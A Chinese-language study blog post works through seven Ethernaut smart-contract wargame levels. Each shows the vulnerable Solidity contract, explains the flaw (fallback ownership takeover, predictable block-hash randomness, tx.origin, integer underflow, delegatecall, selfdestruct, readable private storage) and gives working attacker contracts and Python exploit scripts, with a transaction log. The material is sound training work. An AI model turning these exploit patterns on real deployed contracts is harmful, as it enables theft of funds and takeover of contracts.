# [BlockChain] Ethernaut做题笔记（更新中）


## Before Start

其实很早就开始想学区块链安全了，但是因为环境炸了、Ropsten测试链关了和懒等等原因直到Hackergame的链上记忆大师题才开始上手实操区块链题。后来在强网拟态和N1CTF等比赛中由于不熟悉ctf区块链题的交互方式也是一直在鸽子。

后来看wp找到了[这个仓库](https://github.com/B1ue1nWh1te/Poseidon)才开始进行一个题的做。

先从[这个靶场](https://ethernaut.openzeppelin.com)打起

## Fallback

其实这个题是可以通过Console交互来完成的，但是我还是想试一试用神奇的Poseidon库。

### 题目

目标：成为合约的owner并清空Balance

```solidity
contract Fallback {

  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### 题目分析

考点：fallback函数

```solidity
receive() external payable {
	require(msg.value > 0 && contributions[msg.sender] > 0);
	owner = msg.sender;
}
```

- 合约中允许包含一个未命名的函数（Fallback 函数），这个函数没有参数和返回值。
- 如果在调用合约时，没有函数与给定的标识匹配，Fallback 函数会被执行。
- 每当合约收到以太币，Fallback 函数就会被执行。

在本题的 Fallback 函数中（如上），若随交易发送的以太币`msg.value`和交易发送者的`contribution`均大于0，则可以变更合约owner。

同时，在`contribute()`函数中，可以为消息发送者添加很少`contribution`。很显然通过这个函数使`contribution`超过 owner 并不现实。但是这个函数可以帮助我们满足 Fallback 函数中`contribution > 0`的限制。

### 解题思路

- 调用`contribute()`函数，附带少量以太币，满足`contribution > 0`
- 向合约转账少量以太币，触发`fallback`函数，成为合约owner
- 调用`withdraw()`函数清空 balance 达成目标。

使用Poseidon库进行交互。（附注释）

```python
from Poseidon.Blockchain import *

#连接到Sepolia测试链
chain = Chain("https://rpc.sepolia.org")

#用私钥创建账户实例。由于这里用的是真实的账户隐去私钥。
account = Account(chain, "your private key")

#编译题目合约，创建合约实例
abi, bytecode = BlockchainUtils.Compile("fallback.sol", "Fallback")
contractAddress = 0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
contract = Contract(account, contractAddress, abi)

#调用contribute函数。由于常规函数调用事件不能附带以太币发送，故使用自定义交易方式调用函数
Calldata = contract.EncodeABI("contribute")
account.SendTransaction(contract.Address, Data = Calldata, Value=1)

#触发fallback函数
account.SendTransaction(contract.Address, Data = "", Value=1)

#调用withdraw函数
contract.CallFunction("withdraw")
```

交互日志（可以看到实际的交易事件内容）

```
2022-11-14 21:06:54.128 | SUCCESS  | Poseidon.Blockchain:__init__:32 - 
[Chain][Connect]Successfully connected to [https://rpc.sepolia.org]. [Delay] 20774 ms
2022-11-14 21:06:55.198 | SUCCESS  | Poseidon.Blockchain:GetBasicInformation:49 - 
[Chain][GetBasicInformation]
[ChainId]11155111
[BlockNumber]2287892
[GasPrice]1.500000007 Gwei
[ClientVersion]Geth/v1.10.21-unstable-926b3e08-20220706/linux-amd64/go1.18.1
2022-11-14 21:06:55.229 | SUCCESS  | Poseidon.Blockchain:__init__:241 - 
[Account][Import]Successfully import account [0x7Ebd33D2e0707abD856c86C32D424122D400D9E9].
2022-11-14 21:06:55.505 | SUCCESS  | Poseidon.Blockchain:GetBalance:122 - 
[Chain][GetBalance][0x7Ebd33D2e0707abD856c86C32D424122D400D9E9]
[44716479299591096 Wei]<=>[0.044716479299591096 Ether]
2022-11-14 21:06:55.559 | SUCCESS  | Poseidon.Blockchain:Compile:610 - 
[BlockchainUtils][Compile]
[FileCourse]target.sol
[ContractName]Fallback
[ABI][{'inputs': [], 'stateMutability': 'nonpayable', 'type': 'constructor'}, {'inputs': [], 'name': 'contribute', 'outputs': [], 'stateMutability': 'payable', 'type': 'function'}, {'inputs': [{'internalType': 'address', 'name': '', 'type': 'address'}], 'name': 'contributions', 'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}, {'inputs': [], 'name': 'getContribution', 'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}, {'inputs': [], 'name': 'owner', 'outputs': [{'internalType': 'address payable', 'name': '', 'type': 'address'}], 'stateMutability': 'view', 'type': 'function'}, {'inputs': [], 'name': 'withdraw', 'outputs': [], 'stateMutability': 'nonpayable', 'type': 'function'}, {'stateMutability': 'payable', 'type': 'receive'}]
[Bytecode]608060405234801561001057600080fd5b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550683635c9adc5dea000006000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610515806100ad6000396000f3fe60806040526004361061004e5760003560e01c80633ccfd60b146100f257806342e94c90146101095780638da5cb5b1461016e578063d7bb99ba146101af578063f10fdf5c146101b9576100ed565b366100ed576000341180156100a1575060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054115b6100aa57600080fd5b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550005b600080fd5b3480156100fe57600080fd5b506101076101e4565b005b34801561011557600080fd5b506101586004803603602081101561012c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610312565b6040518082815260200191505060405180910390f35b34801561017a57600080fd5b5061018361032a565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101b7610350565b005b3480156101c557600080fd5b506101ce610499565b6040518082815260200191505060405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102a7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f63616c6c6572206973206e6f7420746865206f776e657200000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561030f573d6000803e3d6000fd5b50565b60006020528060005260406000206000915090505481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b66038d7ea4c68000341061036357600080fd5b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550600080600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411156104975733600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490509056fea2646970667358221220cd16d6454f4e6ceaf88b209f264a2e4d939b06ca8f160907b1209bd7b91b444164736f6c634300060c0033
2022-11-14 21:06:55.569 | SUCCESS  | Poseidon.Blockchain:__init__:484 - 
[Contract][Instantiate]Successfully instantiated contract [0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E].
2022-11-14 21:06:55.569 | SUCCESS  | Poseidon.Blockchain:EncodeABI:555 - 
[Contract][EncodeABI]
[ContractAddress]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
[Function]contribute()
[CallData]0xd7bb99ba
2022-11-14 21:06:56.585 | INFO     | Poseidon.Blockchain:SendTransaction:328 - 
[Account][SendTransaction][Traditional]
[TransactionHash]0x6832df3d3791f79be6b5ef28e2cf3165b37316d8ae238b22e793c5499f057f41
[Txn]{
  "chainId": 11155111,
  "from": "0x7Ebd33D2e0707abD856c86C32D424122D400D9E9",
  "to": "0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E",
  "nonce": 19,
  "value": 1,
  "gasPrice": "1.800000008 Gwei",
  "gas": 10000000,
  "data": "0xd7bb99ba"
}
2022-11-14 21:07:00.423 | SUCCESS  | Poseidon.Blockchain:SendTransaction:335 - 
[Account][SendTransaction][Traditional][Success]
[TransactionHash]0x6832df3d3791f79be6b5ef28e2cf3165b37316d8ae238b22e793c5499f057f41
[BlockNumber]2287893
[From]0x7Ebd33D2e0707abD856c86C32D424122D400D9E9
[To]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
[Value]1 [GasUsed]47729
[Data]0xd7bb99ba
[Logs][]
2022-11-14 21:07:01.182 | INFO     | Poseidon.Blockchain:SendTransaction:328 - 
[Account][SendTransaction][Traditional]
[TransactionHash]0x7ab6b5d76d3866625a63e99c95e19c65e6f627cdbaf346f4fece247419b8e0a9
[Txn]{
  "chainId": 11155111,
  "from": "0x7Ebd33D2e0707abD856c86C32D424122D400D9E9",
  "to": "0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E",
  "nonce": 20,
  "value": 1,
  "gasPrice": "1.800000008 Gwei",
  "gas": 10000000,
  "data": ""
}
2022-11-14 21:07:12.457 | SUCCESS  | Poseidon.Blockchain:SendTransaction:335 - 
[Account][SendTransaction][Traditional][Success]
[TransactionHash]0x7ab6b5d76d3866625a63e99c95e19c65e6f627cdbaf346f4fece247419b8e0a9
[BlockNumber]2287894
[From]0x7Ebd33D2e0707abD856c86C32D424122D400D9E9
[To]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
[Value]1 [GasUsed]28302
[Data]
[Logs][]
2022-11-14 21:07:13.183 | INFO     | Poseidon.Blockchain:CallFunction:501 - 
[Contract][CallFunction]
[ContractAddress]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
[Function]withdraw()
2022-11-14 21:07:13.936 | INFO     | Poseidon.Blockchain:SendTransaction:328 - 
[Account][SendTransaction][Traditional]
[TransactionHash]0xa602d32195f479c92d04a6740a594c90514d873cf327c95161cd4ce7b0120beb
[Txn]{
  "chainId": 11155111,
  "from": "0x7Ebd33D2e0707abD856c86C32D424122D400D9E9",
  "to": "0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E",
  "nonce": 21,
  "value": 0,
  "gasPrice": "1.800000008 Gwei",
  "gas": 32619,
  "data": "0x3ccfd60b"
}
2022-11-14 21:07:24.693 | SUCCESS  | Poseidon.Blockchain:SendTransaction:335 - 
[Account][SendTransaction][Traditional][Success]
[TransactionHash]0xa602d32195f479c92d04a6740a594c90514d873cf327c95161cd4ce7b0120beb
[BlockNumber]2287895
[From]0x7Ebd33D2e0707abD856c86C32D424122D400D9E9
[To]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
[Value]0 [GasUsed]30364
[Data]0x3ccfd60b
[Logs][]





```

## CoinFlip

### 题目

目标：`consecutiveWins >= 10`

```solidity
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### 题目分析

考点：伪随机数

- 以太坊上的所有交易一定是确定性的状态转换操作，并且以一种可计算的方式进行，这意味着没有任何不确定性。所以在区块链上不存在随机性的来源。如果用可以被攻击者控制的变量作为随机数熵源，产生的随机数并不安全。
- 在本题中，合约用区块哈希值产生随机数，这意味着我们可以预测随机数达到连续猜对 coin 的 side 的目的。

### 解题思路

模拟随机数产生。

```solidity
contract Hacker {
  address instance_address = 0x4A839a697814A172e18e78F46df2515D7989427c;
  CoinFlip c = CoinFlip(instance_address);
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  function exp() public {
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    c.flip(side);
  }
}
```

调用10次`exp()`即可。

```python
from Poseidon.Blockchain import *
chain = Chain("https://rpc.sepolia.org")
account = Account(chain, "private key")
abi, bytecode = BlockchainUtils.Compile("coinflip.sol", "Hacker")
contractAddress = "0x4A839a697814A172e18e78F46df2515D7989427c"
#这里要在链上部署我们自己的攻击合约
Hacker = account.DeployContract(abi, bytecode, 0, contractAddress)["Contract"]
for i in range(10):
	Hacker.CallFunction("exp")
```

## Telephone

### 题目

目标：成为合约的 owner

```solidity
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### 题目分析

考点：`tx.origin` 和 `msg.sender` 的区别

- `tx.origin` 指向交易的发起者地址。这个地址一定是账户地址而不是合约地址。
- `msg.sender` 指向函数的直接调用方。这个地址可以是账户地址或合约地址。
- 题目中当`tx.origin`和`msg.sender`不同时，可以任意修改owner。

### 解题思路

尝试创造一个 Hacker 合约来调用`changeOwner`函数。

- 对于 Hacker 合约：`tx.origin`和`msg.sender`均为发起交易的账户地址（player）。
- 对于 Telephone 合约：`tx.origin`仍然是发起交易的账户地址，但`msg.sender`指向直接调用方 Hacker 合约的地址。

```solidity
contract Hacker {
  address instance_addr = 0x3A1783388C15c9A977a63763f13A4374c6b691b2;
  Telephone t = Telephone(instance_addr);
  function exp() public {
    t.changeOwner(tx.origin);
  }
}
```

```python
from Poseidon.Blockchain import *

chain = Chain("https://rpc.sepolia.org")
account = Account(chain, "key")
abi, bytecode = BlockchainUtils.Compile("telephone.sol", "Hacker")
contractAddress = "0x3A1783388C15c9A977a63763f13A4374c6b691b2"
Hacker = account.DeployContract(abi, bytecode, 0, contractAddress)["Contract"]

Hacker.CallFunction("exp")
```

## Token

### 题目

目的：初始 player 的 balance 为20。尝试使 player 的 balance 超过20。

```solidity
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

### 题目分析

考点：整数溢出。

- 这里`balances`使用`uint`类型，在被减至负数时会下溢变成很大的数。
- 可以利用这一点绕过`require(balances[msg.sender] - _value >= 0);`

### 解题思路

尝试转出大于20的balance造成整数溢出。

```python
from Poseidon.Blockchain import *

chain = Chain("https://rpc.sepolia.org")
account = Account(chain, "key")
abi, bytecode = BlockchainUtils.Compile("token.sol", "Token")
contractAddress = "0xC2E5F52DF603B0E9EC68D893Ec497eA633362E43"
contract = Contract(account, contractAddress, abi)
# 这里目标地址只要不是自己就行
contract.CallFunction("transfer", contract.Address, 30)
```

## Delegation

### 题目

目的：成为合约的owner

```solidity
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

### 题目分析

考点：delegatecall

- Delegatecall 是 solidity 中的一种合约间调用方式。
- 与普通函数调用不同的是，Delegatecall 的上下文为调用合约而非被调用合约。
- 在本题中，若使 Delegation 合约使用 delegatecall 方法调用 delegate 合约，则`msg.sender`还是player的账户地址而不是 Delegation 合约地址
- 在前文fallback题中应该涉及过，调用合约里的函数的本质是向合约地址发送一笔交易，交易数据（data）为该函数的签名哈希，在`Poseidon`库中可以用`EncodeABI`获得这个签名哈希。

### 解题思路

考虑向 Delegation 合约发送一笔交易，data为pwn方法的签名哈希。

- Delegation 合约中没有对应的函数方法，触发 fallback 函数。（详见前文Fallback）
- `msg.data`被原样传入 Delegate 合约，等同于进行了一次`pwn`方法调用，其中`msg.sender`依然为player的账户地址，完成owner修改。

```python
from Poseidon.Blockchain import *

chain = Chain("https://rpc.sepolia.org")
account = Account(chain, "key")
abi, bytecode = BlockchainUtils.Compile("delegate.sol", "Delegate")
contractAddress = "0xf755Cad7611EF1CacA20A0A67a77c50a36bC8D65"
contract = Contract(account, contractAddress, abi)

pwndata = contract.EncodeABI("pwn")
account.SendTransaction(contract.Address, pwndata)
```

## Force

### 题目

目的：尝试给合约转账

```solidity
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### 题目分析

考点：合约自毁强制转账

- 一个合约如果能通过正常渠道收钱，则要求该合约的 fallback 函数必须是 payable 的（很显然本题并不满足）
- 但是合约自毁的时候可以强制把该合约的钱转出

### 解题思路

- 创建一个合约
- 给这个合约打一点钱
- 触发合约自我销毁，强制转账给 Force 合约

```solidity
contract Hacker {
  address instance_addr = 0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D;
  Force f = Force(instance_addr);
  function hack() payable public {}
  function exp() payable public {
    selfdestruct(0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D);
  }
}
```

```python
from Poseidon.Blockchain import *

abi, bytecode = BlockchainUtils.Compile("force.sol", "Hacker")
chain = Chain("https://rpc.sepolia.org")
account = Account(chain, "key")
contractAddress = "0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D"
Hacker = account.DeployContract(abi, bytecode, 0, contractAddress)["Contract"]

hack = Hacker.EncodeABI("hack")
account.SendTransaction(Hacker.Address, Data=hack, Value=1)
Hacker.CallFunction("exp")
```

## Vault

### 题目

目的：`locked == false`

```solidity
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### 题目分析

考点：private变量？

- 在区块链上，所有的变量一定都是公开透明的。
- `private`只能阻止该变量被其他合约访问，不能阻止该变量被攻击者读取

### 解题思路

用`Poseidon`库中的`GetStorage`方法读取该变量。

```python
from Poseidon.Blockchain import *
from Crypto.Util.number import long_to_bytes
abi, bytecode = BlockchainUtils.Compile("vault.sol", "Vault")
chain = Chain("https://rpc.sepolia.org")
account = Account(chain, "key")
contractAddress = "0xd94964083e94B04B23f0F4a57beb0363A0982977"
contract = Contract(account, contractAddress, abi)

passwd = chain.GetStorage(contract.Address, 1)
passwd = long_to_bytes(int(passwd[2:], 16))
contract.CallFunction("unlock", passwd)
```


